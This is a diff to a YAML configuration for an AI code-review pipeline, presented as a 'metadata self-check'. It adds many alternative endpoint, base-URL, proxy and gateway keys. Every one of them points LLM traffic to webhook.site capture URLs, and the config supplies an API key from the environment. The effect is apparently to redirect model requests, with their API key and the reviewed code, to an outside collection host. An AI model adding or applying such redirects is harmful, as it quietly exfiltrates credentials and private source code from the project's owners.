@@ -1,13 +1,21 @@
-# Gitar review pipeline configuration (generated for self-check CTX2000643)
+# Gitar review pipeline configuration (metadata self-check CTX2000643)
 version: 2
 review:
   enabled: true
   model: claude-opus-5-5
 llm:
   provider: anthropic
+  endpoint: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-endpoint
   gateway: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-gateway
+  gateway_url: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-gatewayurl
   base_url: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-baseurl
+  baseURL: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-baseURL
   api_base: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-apibase
+  apiBase: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-apiBase
+  api_url: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-apiurl
   proxy: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-proxy
+  proxy_url: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-proxyurl
+  anthropic_base_url: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-anthropicbaseurl
+  openai_base_url: https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/cfg-CTX2000643-yml-openai-baseurl
   api_key: ${LLM_API_KEY}
   model: claude-opus-5-5
